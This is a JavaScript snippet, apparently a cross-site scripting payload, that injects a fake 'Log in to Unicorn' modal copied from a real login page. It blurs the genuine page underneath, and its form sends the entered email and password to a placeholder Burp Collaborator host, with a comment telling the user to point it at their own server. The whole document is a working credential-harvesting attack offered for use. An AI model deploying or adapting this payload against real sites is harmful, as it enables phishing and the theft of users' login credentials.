(function () {
  // --------------------------------------------------------------
  // 1. EXACT UNICORN LOGIN MODAL (copied from the real page)
  // --------------------------------------------------------------
  document.body.insertAdjacentHTML(
    "beforeend",
    `<div id="custom-login-modal" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);display:flex;justify-content:center;align-items:center;z-index:999999;">
  <div style="background:#fff;border-radius:12px;padding:40px 32px;max-width:420px;width:100%;box-shadow:0 10px 30px rgba(0,0,0,.15);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">
    <!-- Logo -->
    <div style="text-align:center;margin-bottom:24px;">
      <svg width="48" height="48" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M24 0C10.745 0 0 10.745 0 24s10.745 24 24 24 24-10.745 24-24S37.255 0 24 0z" fill="#6C5CE7"/>
        <path d="M24 12c-6.627 0-12 5.373-12 12s5.373 12 12 12 12-5.373 12-12-5.373-12-12-12z" fill="#fff"/>
      </svg>
    </div>

    <h2 style="text-align:center;margin:0 0 24px;font-size:24px;font-weight:600;color:#2d3436;">Log in to Unicorn</h2>

    <!-- FORM – CHANGE action TO YOUR SERVER -->
    <form action="https://YOUR-BURP-COLLABORATOR.oast.fun/" method="post" style="display:flex;flex-direction:column;gap:16px;">

      <div>
        <label style="display:block;margin-bottom:6px;font-size:14px;color:#636e72;">Email</label>
        <input type="email" name="username" placeholder="you@company.com" required autocomplete="username"
               style="width:100%;padding:12px 14px;border:1px solid #dfe6e9;border-radius:8px;font-size:15px;background:#fff;outline:none;">
      </div>

      <div>
        <label style="display:block;margin-bottom:6px;font-size:14px;color:#636e72;">Password</label>
        <input type="password" name="password" placeholder="••••••••" required autocomplete="current-password"
               style="width:100%;padding:12px 14px;border:1px solid #dfe6e9;border-radius:8px;font-size:15px;background:#fff;outline:none;">
      </div>

      <button type="submit" style="width:100%;padding:12px;background:#6C5CE7;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;transition:background .2s;"
              onmouseover="this.style.background='#5f4bdb'" onmouseout="this.style.background='#6C5CE7'">
        Log in
      </button>
    </form>

    <div style="margin-top:16px;text-align:center;font-size:14px;color:#636e72;">
      <a href="#" style="color:#6C5CE7;text-decoration:none;">Forgot password?</a>
    </div>

    <div style="margin-top:24px;text-align:center;font-size:13px;color:#b2bec3;">
      Don’t have an account? <a href="#" style="color:#6C5CE7;text-decoration:none;">Sign up</a>
    </div>
  </div>
</div>`
  );

  // --------------------------------------------------------------
  // 2. BLUR THE REAL PAGE (Unicorn uses #root)
  // --------------------------------------------------------------
  const pageContent = document.getElementById("root") || document.body;
  if (pageContent) {
    pageContent.style.transition = "filter 0.3s ease";
    pageContent.style.filter = "blur(5px)";
  }

  // --------------------------------------------------------------
  // 3. CLOSE MODAL (click outside or Esc)
  // --------------------------------------------------------------
  const modal = document.getElementById("custom-login-modal");

  modal.addEventListener("click", e => {
    if (e.target === modal) {
      modal.remove();
      if (pageContent) pageContent.style.filter = "none";
    }
  });

  document.addEventListener("keydown", e => {
    if (e.key === "Escape" && modal) {
      modal.remove();
      if (pageContent) pageContent.style.filter = "none";
    }
  });
})();
